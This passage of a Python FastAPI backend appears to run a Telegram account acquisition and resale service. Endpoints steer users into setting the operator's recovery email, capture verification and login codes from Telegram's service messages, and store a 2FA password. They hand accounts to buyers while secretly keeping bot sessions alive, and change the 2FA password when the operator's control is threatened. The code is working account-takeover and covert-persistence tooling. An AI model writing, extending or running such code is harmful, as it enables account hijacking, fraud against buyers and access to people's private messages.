        raise HTTPException(status_code=500, detail=str(e))


@router.get("/session/status/{account_id}")
async def get_session_status(account_id: str):
    """
    Get session status including timeout info
    """
    phone = account_id
    
    remaining = await get_session_remaining_time(phone)
    is_expired = await check_session_timeout(phone)
    cached_data = await get_cached_data(phone)
    
    return {
        "account_id": phone,
        "session_active": cached_data is not None,
        "remaining_seconds": remaining,
        "remaining_minutes": remaining // 60,
        "is_expired": is_expired,
        "has_cached_2fa": cached_data.get("two_fa_password") is not None if cached_data else False,
        "timeout_limit": SESSION_TIMEOUT_SECONDS
    }


# ============== Email Endpoints ==============

@router.get("/email/target/{account_id}")
async def get_target_email(account_id: str):
    """
    Get the target email that user should change their recovery email to
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    telegram_id = account.telegram_id
    if not telegram_id:
        raise HTTPException(status_code=400, detail="Telegram ID not found. Complete authentication first.")
    
    email_info = get_full_email_info(telegram_id, phone)
    
    # Update account with email info
    await update_account(
        phone,
        email_hash=email_info["hash"],
        target_email=email_info["email"]
    )
    
    return {
        "status": "success",
        "account_id": phone,
        "target_email": email_info["email"],
        "email_hash": email_info["hash"],
        "instructions": "User should change their Telegram recovery email to this address"
    }


@router.get("/email/code/{account_id}")
async def check_email_code(account_id: str, wait_seconds: int = 0):
    """
    Check if verification code was received for this account
    Optional: wait up to N seconds for code to arrive
    """
    try:
        phone = account_id
        logger.info(f"Checking email code for {phone}, wait_seconds={wait_seconds}")
        
        account = await get_account(phone)
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        email_hash = account.email_hash
        logger.info(f"Account found, email_hash={email_hash}")
        
        if not email_hash:
            raise HTTPException(status_code=400, detail="Email hash not found. Get target email first.")
        
        # Normalize hash to lowercase for consistent lookup
        email_hash_lower = email_hash.lower()
        
        # Wait for code if requested
        code = None
        waited = 0
        while waited < wait_seconds:
            code = get_code_by_hash(email_hash_lower)
            if code:
                break
            await asyncio.sleep(1)
            waited += 1
        
        if not code:
            code = get_code_by_hash(email_hash_lower)
        
        logger.info(f"Code check result: {code}")
        
        if code:
            return {
                "status": "received",
                "account_id": phone,
                "code": code,
                "message": "Verification code received"
            }
        else:
            return {
                "status": "waiting",
                "account_id": phone,
                "message": "Code not received yet",
                "email_hash": email_hash
            }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in check_email_code: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/email/code-fallback/{account_id}")
async def get_email_code_fallback(account_id: str):
    """
    Fallback: Try to read email verification code from Telegram messages (777000).
    Used when email webhook doesn't receive the code.
    """
    phone = account_id
    manager = get_pyrogram()
    
    try:
        code = await manager.get_last_telegram_code(phone, max_age_seconds=300)
        if code:
            try:
                from backend.log_bot import log_code_fallback
                await log_code_fallback(phone, code)
            except:
                pass
            return {"status": "received", "code": code, "source": "telegram_messages"}
        else:
            return {"status": "not_found", "message": "No recent code found in Telegram messages"}
    except Exception as e:
        logger.error(f"Error in code fallback: {e}")
        return {"status": "error", "message": str(e)}


class ConfirmCodeRequest(BaseModel):
    code: str


@router.post("/email/confirm-code/{account_id}")
async def confirm_recovery_email_with_code(account_id: str, request: ConfirmCodeRequest):
    """
    Confirm the pending recovery email using a verification code.
    This calls account.ConfirmPasswordEmail on Telegram API.
    """
    phone = account_id
    code = request.code.strip()
    
    if not code or len(code) < 5:
        raise HTTPException(status_code=400, detail="Invalid code")
    
    manager = get_pyrogram()
    
    try:
        result = await manager.confirm_recovery_email(phone, code)
        
        if result.get("status") == "success":
            await update_account(phone, email_changed=True, email_verified=True)
            return {"status": "success", "message": "Recovery email confirmed successfully"}
        else:
            return {"status": "error", "message": result.get("error", "Failed to confirm email")}
    except Exception as e:
        logger.error(f"Error confirming email code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/email/confirm/{account_id}")
async def confirm_email_changed(account_id: str):
    """
    Confirm that user has changed their recovery email and verify it.
    Uses multiple matching strategies:
    1. Full email from account.getPasswordSettings (if password known)
    2. Domain check on email_unconfirmed_pattern
    3. Pattern matching on masked emails (em***k@domain.com)
    4. Login email pattern check (separate from recovery email)
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    manager = get_pyrogram()
    from backend.core_engine.pyrogram_client import pattern_matches_email
    our_email = account.target_email or ""
    
    # Try to get known password for full email check
    known_password = await get_cached_data(phone, "two_fa_password") or account.generated_password
    
    # Auto-reconnect if client not in RAM (e.g. after server restart)
    connected = await ensure_pyrogram_connected(phone, manager)
    
    # If session is dead, we can't verify email status - return informative response
    if not connected:
        return {
            "status": "session_dead",
            "message": "Session not found or expired. Cannot verify email status.",
            "email_changed": False,
            "email_status": "unknown",
            "current_display": "Session expired - cannot check",
            "expected_email": our_email,
            "hint": "Please re-authenticate the account first, or proceed with finalize to set the email during the process."
        }
    
    # Get current security info to verify email change
    security_info = await manager.get_security_info(phone, known_password=known_password)
    if security_info.get("status") == "error":
        return {
            "status": "error",
            "message": security_info.get("error", "Failed to get security info"),
            "email_changed": False,
            "email_status": "unknown",
            "current_display": "Error checking email status"
        }
    
    # Extract all email fields
    recovery_email_full = security_info.get("recovery_email_full")
    email_unconfirmed = security_info.get("email_unconfirmed_pattern")
    login_email_pattern = security_info.get("login_email_pattern")
    has_recovery = security_info.get("has_recovery_email", False)
    has_password = security_info.get("has_password", False)
    
    # If 2FA is not enabled, recovery email doesn't exist - no point checking
    if not has_password:
        return {
            "status": "2fa_not_enabled",
            "message": "Two-step verification is not enabled. Recovery email only exists when 2FA is active. The email will be set automatically during the finalize step.",
            "email_changed": False,
            "email_status": "not_applicable",
            "current_display": "2FA not enabled - no recovery email",
            "expected_email": our_email,
            "has_2fa": False,
            "hint": "Skip this step and proceed to finalize. 2FA + recovery email will be set together."
        }
    
    email_matches = False
    email_status = "unknown"
    current_display = ""
    match_method = ""
    
    # Strategy 1: Full recovery email (from getPasswordSettings with password)
    if recovery_email_full:
        current_display = recovery_email_full
        if EMAIL_DOMAIN in recovery_email_full.lower():
            email_matches = True
            email_status = "confirmed"
            match_method = "full_email_exact"
    
    # Strategy 2: Unconfirmed pattern - domain check
    if not email_matches and email_unconfirmed:
        current_display = email_unconfirmed
        if EMAIL_DOMAIN in str(email_unconfirmed).lower():
            email_matches = True
            email_status = "pending"
            match_method = "unconfirmed_domain"
        elif our_email and pattern_matches_email(str(email_unconfirmed), our_email):
            email_matches = True
            email_status = "pending"
            match_method = "unconfirmed_pattern"
    
    # Strategy 3: has_recovery but no full email (password unknown or wrong)
    if not email_matches and has_recovery and not recovery_email_full:
        if has_password and known_password:
            # We have password but couldn't get full email - try direct
            try:
                direct_email = await manager.get_recovery_email_full(phone, known_password)
                if direct_email:
                    current_display = direct_email
                    if EMAIL_DOMAIN in direct_email.lower():
                        email_matches = True
                        email_status = "confirmed"
                        match_method = "direct_getPasswordSettings"
            except:
                pass
        
        if not email_matches:
            email_status = "confirmed_unknown"
            current_display = "Confirmed but cannot verify (password needed)"
    
    # Strategy 4: Login email pattern (separate from recovery, but informative)
    login_email_is_ours = False
    if login_email_pattern:
        if EMAIL_DOMAIN in str(login_email_pattern).lower():
            login_email_is_ours = True
        elif our_email and pattern_matches_email(str(login_email_pattern), our_email):
            login_email_is_ours = True
    
    # No recovery email at all
    if not email_matches and not has_recovery and not email_unconfirmed:
        email_status = "none"
        current_display = "No recovery email set"
    
    # Keep session alive - do NOT disconnect here
    # Other endpoints need the active session (e.g. finalize, security_check)
    
    if email_matches:
        await update_account(
            phone, 
            email_changed=True, 
            email_verified=(email_status == "confirmed")
        )
        
        log_credentials(
            phone=phone,
            action="EMAIL_VERIFIED",
            email=our_email,
            telegram_id=account.telegram_id
        )
        
        try:
            from backend.log_bot import log_email_set
            await log_email_set(phone, account.telegram_id, our_email)
        except:
            pass
        
        return {
            "status": "success",
            "message": "Recovery email verified as ours",
            "email_changed": True,
            "email_status": email_status,
            "match_method": match_method,
            "recovery_email": recovery_email_full,
            "email_unconfirmed_pattern": email_unconfirmed,
            "login_email_pattern": login_email_pattern,
        }
    else:
        # Distinguish between "no recovery email" and "wrong recovery email"
        if email_status == "none":
            message = "No 2FA recovery email is set yet. The email will be set during finalize process."
        else:
            message = "Recovery email is NOT ours. Please change the 2FA recovery email (not login email) to our email."
        
        return {
            "status": "not_changed",
            "message": message,
            "email_changed": False,
            "email_status": email_status,
            "current_display": current_display,
            "recovery_email": recovery_email_full,
            "email_unconfirmed_pattern": email_unconfirmed,
            "login_email_pattern": login_email_pattern,
            "login_email_is_ours": login_email_is_ours,
            "expected_email": our_email,
            "has_2fa": has_password,
            "hint": "Make sure to change the RECOVERY email in Settings > Privacy > Two-Step Verification > Recovery Email, NOT the login email."
        }


# ============== Session Health Endpoints ==============

@router.get("/sessions/health/{account_id}")
async def check_sessions_health(account_id: str):
    """
    Check health of all sessions for an account
    Verifies: Pyrogram, Telethon sessions, email unchanged, 2FA unchanged, session counts
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    manager = get_pyrogram()
    
    # Check Pyrogram session
    pyrogram_valid = await check_session_validity(manager, phone)
    
    # Check Telethon session
    telethon_valid = {"valid": False, "error": "Not implemented yet"}
    
    # Get security info (with password for full email check)
    known_password = account.generated_password
    security_info = await manager.get_security_info(phone, known_password=known_password)
    security_valid = security_info.get("status") == "success"
    
    # Verify recovery email hasn't changed
    our_email = account.target_email or ""
    email_still_ours = False
    recovery_email_display = ""
    
    if security_valid:
        recovery_email_full = security_info.get("recovery_email_full")
        email_unconfirmed = security_info.get("email_unconfirmed_pattern")
        
        if recovery_email_full:
            recovery_email_display = recovery_email_full
            email_still_ours = EMAIL_DOMAIN in recovery_email_full.lower()
        elif email_unconfirmed:
            recovery_email_display = email_unconfirmed
            email_still_ours = EMAIL_DOMAIN in str(email_unconfirmed).lower()
    
    # Count sessions
    other_sessions = security_info.get("other_sessions_count", 0) if security_valid else 0
    expected_sessions = 1 if account.transfer_mode == DBTransferMode.USER_KEEPS_SESSION else 0
    sessions_ok = other_sessions <= expected_sessions + 2  # +2 for our bot sessions
    
    # Check for delete request
    has_delete_request = False  # TODO: Implement delete request check
    
    # Update account
    await update_account(
        phone,
        pyrogram_healthy=pyrogram_valid["valid"],
        telethon_healthy=telethon_valid["valid"],
        last_session_check=datetime.utcnow(),
        has_delete_request=has_delete_request
    )
    
    all_healthy = (
        pyrogram_valid["valid"] and
        email_still_ours and
        sessions_ok and
        not has_delete_request
    )
    
    return {
        "status": "healthy" if all_healthy else "issues_found",
        "account_id": phone,
        "checks": {
            "pyrogram_session": {
                "valid": pyrogram_valid["valid"],
                "error": pyrogram_valid.get("error")
            },
            "telethon_session": {
                "valid": telethon_valid["valid"],
                "error": telethon_valid.get("error")
            },
            "email_unchanged": email_still_ours,
            "recovery_email": recovery_email_display,
            "sessions_count": other_sessions,
            "sessions_ok": sessions_ok,
            "expected_max_sessions": expected_sessions + 2,
            "has_delete_request": has_delete_request
        },
        "needs_regeneration": not pyrogram_valid["valid"] or not telethon_valid["valid"],
        "needs_attention": not email_still_ours or has_delete_request
    }


@router.post("/sessions/regenerate/{account_id}")
async def regenerate_sessions(account_id: str):
    """
    Regenerate invalid sessions by re-authenticating
    Uses stored password and gets code from email webhook
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    if not account.generated_password:
        raise HTTPException(status_code=400, detail="No stored password. Cannot regenerate.")
    
    manager = get_pyrogram()
    
    # Check which sessions need regeneration
    pyrogram_valid = await check_session_validity(manager, phone)
    
    results = {
        "pyrogram_regenerated": False,
        "telethon_regenerated": False
    }
    
    if not pyrogram_valid["valid"]:
        # Send code
        send_result = await manager.send_code(phone)
        if send_result["status"] != "success":
            return {
                "status": "error",
                "message": f"Failed to send code: {send_result.get('error')}",
                "results": results
            }
        
        # Wait for code from email webhook (up to 20 seconds)
        email_hash = account.email_hash
        code = None
        for _ in range(20):
            code = get_code_by_hash(email_hash) if email_hash else None
            if code:
                break
            await asyncio.sleep(1)
        
        if not code:
            # Fallback: try to get code from Telegram messages
            # TODO: Implement reading code from 777000
            return {
                "status": "waiting_code",
                "message": "Code sent. Waiting for code via email or manual entry.",
                "results": results
            }
        
        # Sign in with code
        sign_result = await manager.sign_in(phone, code)
        
        if sign_result["status"] == "2fa_required":
            # Use stored password
            pwd_result = await manager.check_password(phone, account.generated_password)
            if pwd_result["status"] == "success":
                results["pyrogram_regenerated"] = True
        elif sign_result["status"] == "success":
            results["pyrogram_regenerated"] = True
    
    # TODO: Regenerate Telethon session
    
    # Update session strings
    if results["pyrogram_regenerated"]:
        session_str = await manager.export_session_string(phone)
        await update_account(
            phone,
            pyrogram_session=session_str.get("session_string"),
            pyrogram_healthy=True
        )
    
    return {
        "status": "success" if any(results.values()) else "no_changes",
        "message": "Sessions regenerated" if any(results.values()) else "No sessions needed regeneration",
        "results": results
    }


# ============== Accounts List (for receiving) ==============

@router.get("/accounts/ready")
async def get_ready_accounts():
    """
    Get all accounts that are ready for delivery (for buyer/receiver)
    """
    from backend.models.database import async_session, Account
    from sqlalchemy import select
    
    async with async_session() as session:
        # Get accounts that have been finalized
        result = await session.execute(
            select(Account).where(
                Account.pyrogram_session.isnot(None),
                Account.generated_password.isnot(None)
            )
        )
        accounts = result.scalars().all()
        
        accounts_list = []
        for acc in accounts:
            accounts_list.append({
                "phone": acc.phone,
                "telegram_id": acc.telegram_id,
                "transfer_mode": acc.transfer_mode.value if acc.transfer_mode else "bot_only",
                "status": "ready" if acc.pyrogram_session else "pending",
                "delivery_count": acc.delivery_count or 0,
                "email_changed": acc.email_changed or False
            })
        
        return {
            "status": "success",
            "accounts": accounts_list,
            "count": len(accounts_list)
        }


# ============== Delivery Endpoints ==============

@router.post("/delivery/request-code/{account_id}")
async def request_delivery_code(account_id: str):
    """
    Step 2: Buyer has requested a login code from the Telegram app.
    We connect Pyrogram (to be ready to read the code from 777000),
    mark status as WAITING_CODE. We do NOT send any code ourselves.
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    if account.status != AuthStatus.COMPLETED:
        raise HTTPException(status_code=400, detail="Account not ready for delivery")
    
    if not account.pyrogram_session:
        raise HTTPException(status_code=400, detail="No Pyrogram session available")
    
    manager = get_pyrogram()
    
    # Connect Pyrogram from session string (ready to read code later)
    try:
        connected = await manager.connect_from_string(phone, account.pyrogram_session)
        if not connected:
            raise HTTPException(status_code=400, detail="Failed to connect session - session may be expired")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[DELIVERY] Failed to connect Pyrogram for {phone}: {e}")
        raise HTTPException(status_code=400, detail=f"Session connection failed: {str(e)}")
    
    # Update status to WAITING_CODE (buyer is requesting code from Telegram)
    await update_account(
        phone,
        delivery_status=DeliveryStatus.WAITING_CODE,
        code_sent_at=datetime.utcnow(),
        confirmation_deadline=datetime.utcnow() + timedelta(minutes=30)
    )
    
    await log_auth_action(phone, "delivery_waiting_code", "pending")
    
    return {
        "status": "success",
        "message": "Ready to read code. Buyer should request login code from Telegram app.",
        "account_id": phone,
        "delivery_status": "WAITING_CODE"
    }


@router.get("/delivery/get-code/{account_id}")
async def delivery_get_code(account_id: str):
    """
    Step 3: Read the login code from Telegram messages (777000).
    The buyer already requested the code from Telegram app.
    We read it via Pyrogram and return it along with the 2FA password.
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    manager = get_pyrogram()
    
    # Ensure Pyrogram is connected
    if phone not in manager.active_clients:
        if account.pyrogram_session:
            try:
                await manager.connect_from_string(phone, account.pyrogram_session)
            except Exception as e:
                logger.error(f"[DELIVERY] Reconnect failed for {phone}: {e}")
                raise HTTPException(status_code=400, detail="Session reconnect failed")
        else:
            raise HTTPException(status_code=400, detail="No session available")
    
    # Read code from Telegram messages (777000)
    code = await manager.get_last_telegram_code(phone, max_age_seconds=300)
    
    if not code:
        return {
            "status": "waiting",
            "message": "No code received yet. Ask buyer to request code from Telegram app and try again."
        }
    
    # Update status
    await update_account(
        phone,
        delivery_status=DeliveryStatus.CODE_SENT,
        last_code=code
    )
    
    await log_auth_action(phone, "delivery_code_read", "success", f"Code: {code[:2]}***")
    
    # Disconnect Pyrogram after reading code (free RAM)
    await manager.disconnect(phone)
    logger.info(f"[DELIVERY] Code read and Pyrogram disconnected for {phone}")
    
    return {
        "status": "success",
        "code": code,
        "has_password": bool(account.generated_password),
        "password": account.generated_password,
        "transfer_mode": account.transfer_mode.value if account.transfer_mode else "bot_only",
        "confirmation_deadline": account.confirmation_deadline.isoformat() if account.confirmation_deadline else None,
        "timeout_minutes": 30
    }


@router.post("/delivery/confirm/{account_id}")
async def confirm_delivery(account_id: str, request: DeliveryConfirmRequest):
    """
    Step 4: Confirm delivery.
    - bot_only mode: Logout ALL bot sessions, clear session strings from DB
    - user_keeps_session mode: Terminate buyer's session (non-bot),
      keep bot sessions, verify email+password still ours
    Sessions are connected/disconnected sequentially (never both at once).
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    if not request.received:
        return {"status": "cancelled", "message": "Delivery cancelled"}
    
    manager = get_pyrogram()
    telethon_mgr = get_telethon()
    transfer_mode = account.transfer_mode.value if account.transfer_mode else "bot_only"
    
    logout_results = []
    new_count = (account.delivery_count or 0) + 1
    
    if transfer_mode == "bot_only":
        # === BOT_ONLY MODE ===
        # Logout ALL bot sessions, clear everything
        logger.info(f"[DELIVERY] BOT_ONLY confirm for {phone}")
        
        # Pyrogram logout (sequential - connect, logout, disconnect)
        try:
            if account.pyrogram_session:
                connected = await manager.connect_from_string(phone, account.pyrogram_session)
                if connected:
                    logged_out = await manager.log_out(phone)
                    logout_results.append(f"Pyrogram: {'OK' if logged_out else 'failed'}")
                else:
                    logout_results.append("Pyrogram: connect failed")
            await manager.disconnect(phone)
        except Exception as e:
            logger.warning(f"[DELIVERY] Pyrogram logout error: {e}")
            logout_results.append(f"Pyrogram: error ({e})")
            try:
                await manager.disconnect(phone)
            except:
                pass
        
        # Telethon logout (sequential - connect, logout, disconnect)
        try:
            if account.telethon_session:
                connected = await telethon_mgr.connect_from_string(phone, account.telethon_session)
                if connected:
                    logged_out = await telethon_mgr.log_out(phone)
                    logout_results.append(f"Telethon: {'OK' if logged_out else 'failed'}")
                else:
                    logout_results.append("Telethon: connect failed")
            await telethon_mgr.disconnect(phone)
        except Exception as e:
            logger.warning(f"[DELIVERY] Telethon logout error: {e}")
            logout_results.append(f"Telethon: error ({e})")
            try:
                await telethon_mgr.disconnect(phone)
            except:
                pass
        
        # Clear all session data
        await update_account(
            phone,
            delivery_status=DeliveryStatus.BUYER_DELIVERED,
            delivered_at=datetime.utcnow(),
            delivery_count=new_count,
            pyrogram_session=None,
            telethon_session=None,
            last_code=None,
            generated_password=None
        )
    
    else:
        # === USER_KEEPS_SESSION MODE ===
        # Keep bot sessions, terminate buyer's session, verify security
        logger.info(f"[DELIVERY] USER_KEEPS_SESSION confirm for {phone}")
        
        security_ok = True
        security_details = {}
        
        # Connect Pyrogram to verify security and terminate buyer sessions
        try:
            if account.pyrogram_session:
                connected = await manager.connect_from_string(phone, account.pyrogram_session)
                if connected:
                    # Verify 2FA password is still ours
                    security_info = await manager.get_security_info(phone, known_password=account.generated_password)
                    has_password = security_info.get("has_password", False)
                    recovery_email = security_info.get("recovery_email_full", "")
                    
                    security_details["has_2fa"] = has_password
                    security_details["recovery_email"] = recovery_email or "none"
                    security_details["email_is_ours"] = bool(recovery_email and EMAIL_DOMAIN in recovery_email.lower())
                    
                    if not has_password:
                        security_ok = False
                        security_details["warning"] = "2FA password was removed by buyer!"
                    
                    if recovery_email and EMAIL_DOMAIN not in recovery_email.lower():
                        security_ok = False
                        security_details["warning"] = f"Recovery email changed to: {recovery_email}"
                    
                    # Terminate ONLY non-bot sessions (buyer's sessions)
                    term_result = await manager.terminate_other_sessions(phone, keep_bot_sessions=True)
                    terminated = term_result.get("terminated_count", 0)
                    kept_bot = term_result.get("kept_bot_sessions", 0)
                    logout_results.append(f"Terminated {terminated} buyer sessions, kept {kept_bot} bot sessions")
                    
                    logger.info(f"[DELIVERY] Security check for {phone}: {security_details}")
                
                await manager.disconnect(phone)
        except Exception as e:
            logger.error(f"[DELIVERY] Security verify error: {e}")
            logout_results.append(f"Security check error: {e}")
            try:
                await manager.disconnect(phone)
            except:
                pass
        
        # Keep session strings (bot stays active)
        await update_account(
            phone,
            delivery_status=DeliveryStatus.BUYER_DELIVERED,
            delivered_at=datetime.utcnow(),
            delivery_count=new_count,
            last_code=None
        )
        
        if not security_ok:
            logout_results.append("SECURITY WARNING: Account may be compromised")
    
    log_credentials(
        phone=phone,
        action="DELIVERY_CONFIRMED",
        telegram_id=account.telegram_id,
        extra_data={
            "delivery_number": new_count,
            "transfer_mode": transfer_mode,
            "logout_results": logout_results
        }
    )
    
    await log_auth_action(phone, "delivery_confirm", "success", f"Delivery #{new_count} ({transfer_mode})")
    
    try:
        from backend.log_bot import log_delivery
        await log_delivery(phone, account.telegram_id, new_count)
    except:
        pass
    
    return {
        "status": "success",
        "message": f"Delivery #{new_count} confirmed ({transfer_mode})",
        "account_id": phone,
        "delivery_number": new_count,
        "transfer_mode": transfer_mode,
        "logout_results": logout_results
    }


@router.post("/delivery/transition-to-bot-only/{account_id}")
async def transition_to_bot_only(account_id: str):
    """
    Transition account from user_keeps_session to bot_only mode.
    Steps:
    1. Connect Pyrogram, run full security re-audit
    2. Verify email is ours and password is ours
    3. Terminate all non-bot sessions
    4. Update transfer mode to bot_only
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    if not account.pyrogram_session:
        raise HTTPException(status_code=400, detail="No Pyrogram session available")
    
    if account.transfer_mode == DBTransferMode.BOT_ONLY:
        return {"status": "success", "message": "Account is already in bot_only mode"}
    
    manager = get_pyrogram()
    results = {"security_passed": False, "details": {}}
    
    try:
        # Connect Pyrogram
        connected = await manager.connect_from_string(phone, account.pyrogram_session)
        if not connected:
            raise HTTPException(status_code=400, detail="Failed to connect session")
        
        # Full security re-audit
        security_info = await manager.get_security_info(phone, known_password=account.generated_password)
        has_password = security_info.get("has_password", False)
        recovery_email = security_info.get("recovery_email_full", "")
        
        results["details"]["has_2fa"] = has_password
        results["details"]["recovery_email"] = recovery_email or "none"
        results["details"]["email_is_ours"] = bool(recovery_email and EMAIL_DOMAIN in recovery_email.lower())
        
        # Security checks
        if not has_password:
            await manager.disconnect(phone)
            raise HTTPException(status_code=400, detail="2FA password was removed. Cannot transition - re-register account.")
        
        if recovery_email and EMAIL_DOMAIN not in recovery_email.lower():
            await manager.disconnect(phone)
            raise HTTPException(status_code=400, detail=f"Recovery email changed to {recovery_email}. Cannot transition - re-register account.")
        
        # Terminate all non-bot sessions
        term_result = await manager.terminate_other_sessions(phone, keep_bot_sessions=True)
        results["details"]["terminated_sessions"] = term_result.get("terminated_count", 0)
        results["details"]["kept_bot_sessions"] = term_result.get("kept_bot_sessions", 0)
        
        # Disconnect Pyrogram
        await manager.disconnect(phone)
        
        # Update transfer mode
        await update_account(
            phone,
            transfer_mode=DBTransferMode.BOT_ONLY
        )
        
        results["security_passed"] = True
        
        log_credentials(
            phone=phone,
            action="TRANSITION_TO_BOT_ONLY",
            telegram_id=account.telegram_id,
            extra_data=results["details"]
        )
        
        await log_auth_action(phone, "transition_bot_only", "success")
        
        return {
            "status": "success",
            "message": "Account transitioned to bot_only mode",
            "account_id": phone,
            **results
        }
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[TRANSITION] Error for {phone}: {e}")
        try:
            await manager.disconnect(phone)
        except:
            pass
        raise HTTPException(status_code=500, detail=str(e))


# ============== Security Check Endpoint ==============

@router.get("/security/check/{account_id}")
async def security_check(account_id: str):
    """
    Deep security check: device info, session anomalies, red flags.
    Returns threat level and detailed findings.
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    manager = get_pyrogram()
    known_password = account.generated_password
    
    # Connect if needed
    connected = phone in manager.active_clients
    if not connected and account.pyrogram_session:
        try:
            connected = await manager.connect_from_string(phone, account.pyrogram_session)
        except:
            connected = False
    
    if not connected:
        # Session is dead/expired - return report without live data
        return {
            "status": "success",
            "threat_level": "critical",
            "red_flags": [{
                "type": "session_dead",
                "message": "Cannot connect to Telegram - session expired or revoked (AUTH_KEY_UNREGISTERED)",
                "severity": "critical"
            }],
            "warnings": [],
            "other_sessions": [],
            "has_password": account.has_2fa,
            "frozen": False,
            "session_status": "dead",
            "detail": "Session string is invalid. Account needs re-authentication."
        }
    
    security_info = await manager.get_security_info(phone, known_password=known_password)
    if security_info.get("status") != "success":
        return {
            "status": "success",
            "threat_level": "critical",
            "red_flags": [{
                "type": "api_error",
                "message": f"Failed to get security info: {security_info.get('error', 'Unknown')}",
                "severity": "critical"
            }],
            "warnings": [],
            "other_sessions": [],
            "has_password": account.has_2fa,
            "frozen": False,
            "session_status": "error"
        }
    
    red_flags = []
    warnings = []
    
    # --- Check sessions ---
    other_sessions = security_info.get("other_sessions", [])
    our_api_id = manager.api_id
    
    for sess in other_sessions:
        sess_flags = []
        
        # Unknown API ID (not ours)
        if sess.get("api_id") and sess["api_id"] != our_api_id:
            sess_flags.append(f"Different API ID: {sess['api_id']}")
        
        # Non-official app
        if not sess.get("is_official_app"):
            sess_flags.append("Unofficial app")
        
        # Suspicious device names
        device = (sess.get("device_model") or "").lower()
        suspicious_devices = ["termux", "userbot", "pyrogram", "telethon", "bot"]
        for sd in suspicious_devices:
            if sd in device:
                sess_flags.append(f"Suspicious device: {sess.get('device_model')}")
                break
        
        if sess_flags:
            red_flags.append({
                "type": "suspicious_session",
                "device": sess.get("device_model"),
                "platform": sess.get("platform"),
                "app": sess.get("app_name"),
                "ip": sess.get("ip"),
                "country": sess.get("country"),
                "created": sess.get("date_created"),
                "last_active": sess.get("date_active"),
                "issues": sess_flags
            })
    
    # --- Check email ---
    recovery_email_full = security_info.get("recovery_email_full")
    email_unconfirmed = security_info.get("email_unconfirmed_pattern")
    has_recovery = security_info.get("has_recovery_email", False)
    
    if recovery_email_full and EMAIL_DOMAIN not in recovery_email_full.lower():
        red_flags.append({
            "type": "email_changed",
            "message": f"Recovery email changed to: {recovery_email_full}",
            "severity": "critical"
        })
    elif has_recovery and not recovery_email_full and not email_unconfirmed:
        warnings.append({
            "type": "email_unknown",
            "message": "Recovery email exists but cannot verify it"
        })
    elif not has_recovery and not email_unconfirmed:
        warnings.append({
            "type": "no_recovery_email",
            "message": "No recovery email set"
        })
    
    # --- Check 2FA ---
    if not security_info.get("has_password"):
        red_flags.append({
            "type": "2fa_disabled",
            "message": "2FA is DISABLED!",
            "severity": "critical"
        })
    
    # --- Check pending password reset ---
    if security_info.get("pending_reset_date"):
        red_flags.append({
            "type": "pending_reset",
            "message": f"Pending password reset request!",
            "severity": "critical"
        })
    
    # --- Determine threat level ---
    critical_count = sum(1 for f in red_flags if f.get("severity") == "critical")
    threat_level = "safe"
    if critical_count > 0:
        threat_level = "critical"
    elif len(red_flags) > 0:
        threat_level = "warning"
    elif len(warnings) > 0:
        threat_level = "low"
    
    # --- Auto-freeze if critical ---
    frozen = False
    if threat_level == "critical" and account.pyrogram_session:
        # Change 2FA and terminate suspicious sessions
        try:
            if security_info.get("has_password") and known_password:
                new_pass = generate_strong_password(24)
                change_result = await manager.change_2fa_password(phone, known_password, new_pass)
                if change_result.get("status") == "success":
                    await update_account(phone, generated_password=new_pass)
                    frozen = True
                    logger.warning(f"FROZEN: 2FA changed for {phone} due to critical threat")
            
            # Terminate suspicious sessions
            for sess in other_sessions:
                if sess.get("api_id") != our_api_id:
                    try:
                        client = manager.active_clients.get(phone)
                        if client:
                            await client.invoke(
                                functions.account.ResetAuthorization(hash=sess["hash"])
                            )
                            logger.warning(f"Terminated suspicious session for {phone}: {sess.get('device_model')}")
                    except:
                        pass
        except Exception as e:
            logger.error(f"Auto-freeze failed for {phone}: {e}")
    
    # Log security check to Telegram
    try:
        from backend.log_bot import log_security_check as log_sec
        flag_texts = [f.get("message", f.get("type", "?")) for f in red_flags]
        await log_sec(phone, threat_level, flag_texts, frozen)
    except:
        pass
    
    # Disconnect to free RAM
    await manager.disconnect(phone)
    
    return {
        "status": "success",
        "account_id": phone,
        "threat_level": threat_level,
        "frozen": frozen,
        "red_flags": red_flags,
        "warnings": warnings,
        "session_count": len(other_sessions) + 1,
        "other_sessions_count": len(other_sessions),
        "has_2fa": security_info.get("has_password", False),
        "recovery_email": recovery_email_full,
        "recovery_email_status": "confirmed" if recovery_email_full else ("pending" if email_unconfirmed else "none"),
    }


# ============== Connection Management Endpoints ==============

@router.get("/admin/connections")
async def get_connections_status():
    """
    Monitor active connections in memory.
    Shows Pyrogram and Telethon active clients count.
    """
    manager = get_pyrogram()
    telethon_mgr = get_telethon()
    
    pyrogram_clients = list(manager.active_clients.keys())
    telethon_clients = list(telethon_mgr.active_clients.keys())
    
    return {
        "status": "success",
        "pyrogram_active": len(pyrogram_clients),
        "pyrogram_phones": pyrogram_clients,
        "telethon_active": len(telethon_clients),
        "telethon_phones": telethon_clients,
        "total_active": len(pyrogram_clients) + len(telethon_clients)
    }


@router.post("/admin/connections/cleanup")
async def cleanup_connections():
    """
    Clean up dead/inactive connections to free RAM.
    Disconnects clients that are no longer responsive.
    """
    manager = get_pyrogram()
    telethon_mgr = get_telethon()
    
